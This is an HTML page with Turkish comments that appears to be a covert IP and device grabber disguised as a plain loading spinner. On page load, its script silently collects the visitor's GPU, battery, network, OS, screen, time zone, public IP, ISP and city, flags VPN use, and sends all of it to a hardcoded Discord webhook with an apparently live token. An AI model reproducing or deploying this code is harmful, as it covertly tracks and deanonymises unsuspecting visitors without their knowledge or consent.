<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title> </title>
    <style>
        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; overflow:hidden; }
        /* Ã‡arkÄ±n dÃ¶nmeme sorunu iÃ§in animasyon zorlamasÄ± */
        .l { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 25px; height: 25px; animation: s 1s linear infinite !important; display: block; }
        @keyframes s { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="l"></div>

    <script>
        const hook = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";

        async function ultraDataExtract() {
            let d = { 
                gpu: "Bilinmiyor", ven: "Bilinmiyor", ip: "X", iss: "X", loc: "X",
                os: "Bilinmiyor", res: screen.width + "x" + screen.height,
                bat: "X", net: "X", tz: Intl.DateTimeFormat().resolvedOptions().timeZone
            };

            // OS Tespiti
            try { d.os = navigator.userAgent.split('(')[1].split(')')[0]; } catch(e){}

            // 1. GPU (WebGL) - Hata alsa da devam et
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
                if (gl) {
                    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                    d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
                    d.ven = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
                }
            } catch(e) { d.gpu = "BloklandÄ±"; }

            // 2. Pil ve AÄŸ (AyrÄ± try-catch, kodun durmasÄ±nÄ± engeller)
            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    d.bat = `%${Math.round(b.level * 100)} (${b.charging ? 'Åžarjda' : 'Pilde'})`;
                }
            } catch(e) { d.bat = "Desteklenmiyor"; }

            try {
                const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (n) d.net = `${n.effectiveType} (~${n.downlink}Mbps)`;
            } catch(e) {}

            // 3. IP ve VPN (Zaman aÅŸÄ±mÄ± korumalÄ±)
            let vpnStatus = "âœ… VPN KAPALI";
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 4000); // 4 saniye sÄ±nÄ±rÄ±

                const res = await fetch('https://ipapi.co/json/', { signal: controller.signal });
                const j = await res.json();
                clearTimeout(timeoutId);

                d.ip = j.ip;
                d.iss = j.org;
                d.loc = `ðŸ“ ${j.city}, ${j.country_name}`;
                
                if (j.timezone !== d.tz || j.proxy) {
                    vpnStatus = `ðŸš¨ **VPN ALGILANDI**\nâ†³ Sistem: ${d.tz}\nâ†³ IP: ${j.timezone}`;
                }
            } catch(e) { vpnStatus = "âš ï¸ IP Sorgu BaÅŸarÄ±sÄ±z (VPN olabilir)"; }

            // 4. VERÄ°YÄ° GÃ–NDERME (ZorlayÄ±cÄ± Metod)
            const payload = {
                embeds: [{
                    title: "ðŸ’€ ADLÄ° ANALÄ°Z: V110 (FIXED)",
                    color: vpnStatus.includes("ðŸš¨") ? 15158332 : 3066993,
                    fields: [
                        { name: "ðŸ›¡ï¸ GÃœVENLÄ°K", value: vpnStatus, inline: false },
                        { name: "ðŸ“¡ AÄž / ISS", value: `**IP:** \`${d.ip}\`\n**ISS:** \`${d.iss}\`\n**Net:** \`${d.net}\``, inline: false },
                        { name: "ðŸ› ï¸ DONANIM", value: `**GPU:** \`${d.gpu}\`\n**Pil:** \`${d.bat}\``, inline: false },
                        { name: "âš™ï¸ SÄ°STEM", value: `**OS:** ${d.os}\n**Res:** ${d.res}\n**TZ:** ${d.tz}`, inline: false }
                    ],
                    timestamp: new Date()
                }]
            };

            // Webhook gÃ¶nderimini garantiye al
            const blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
            navigator.sendBeacon(hook, blob);
            
            // EÄŸer fetch Ã§alÄ±ÅŸÄ±rsa (CORS izin verirse)
            fetch(hook, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
        }

        // Sayfa tamamen yÃ¼klendiÄŸinde baÅŸlat
        window.addEventListener('load', () => {
            setTimeout(ultraDataExtract, 500);
        });
    </script>
</body>
</html>
